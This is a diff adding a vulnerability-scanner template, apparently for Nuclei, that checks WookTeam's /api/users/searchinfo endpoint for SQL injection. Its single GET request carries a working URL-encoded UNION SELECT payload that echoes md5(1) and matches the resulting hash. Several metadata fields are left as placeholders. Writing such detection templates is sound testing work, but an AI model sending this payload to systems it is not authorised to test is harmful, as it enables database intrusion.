@@ -1,0 +1,18 @@
+id: WookTeam-searchinfo-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: WookTeam接口searchinfo存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cmd5%281%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b92382'
